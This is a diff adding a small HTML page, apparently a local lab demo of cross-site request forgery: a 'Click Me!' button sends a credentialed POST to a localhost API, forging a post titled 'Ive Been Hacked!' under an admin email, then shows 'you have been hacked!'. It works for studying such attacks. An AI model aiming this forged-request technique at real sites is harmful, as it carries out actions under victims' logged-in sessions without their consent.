@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <button type="button" onclick="clickHandler()">Click Me!</button>
+
+    <script>
+      function clickHandler() {
+        const res = fetch("http://localhost:3000/api/post", {
+          headers: {
+            accept: "*/*",
+            "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
+            "content-type": "application/json",
+            "sec-ch-ua":
+              '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-platform": '"Windows"',
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode":"no-cors",
+            "Access-Control-Allow-Origin":"*",
+           
+          },
+          referrer: "http://localhost:3000/create",
+          referrerPolicy: "unsafe-url",
+          body: '{"title":"Ive Been Hacked!","content":"This post is sent from another browser!","email":"admin@mail","id":"","link":""}',
+          method: "POST",
+          mode: "cors",
+          credentials: "include",
+        })
+          .then((res) => res.json())
+          .then((res) => {
+            const box = document.createElement("h1");
+            box.id = "msg";
+            box.innerText = `you have been hacked! `;
+            document.body.appendChild(box);
+          });
+
+        console.log(res.body);
+      }
+    </script>
+  </body>
+</html>
+
